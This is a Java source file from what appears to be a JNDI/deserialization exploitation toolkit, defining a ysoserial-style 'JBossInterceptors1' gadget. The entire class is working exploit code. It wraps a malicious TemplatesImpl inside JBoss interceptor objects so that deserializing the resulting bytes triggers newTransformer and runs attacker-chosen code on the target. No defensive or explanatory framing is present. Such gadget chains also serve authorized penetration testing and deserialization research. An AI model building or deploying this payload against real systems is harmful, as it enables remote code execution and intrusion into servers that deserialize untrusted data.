package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.*;

public class JBossInterceptors1 implements ObjectPayload<Object> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object tpl = Gadgets.createTemplatesImpl(type, param);

        InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata  metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference     interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        Reflections.setAccessible(defaultMethodMetadataConstructor);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {

            public Object createFor(InterceptorReference paramInterceptorReference) {

                return tpl;
            }
        };

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory));
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}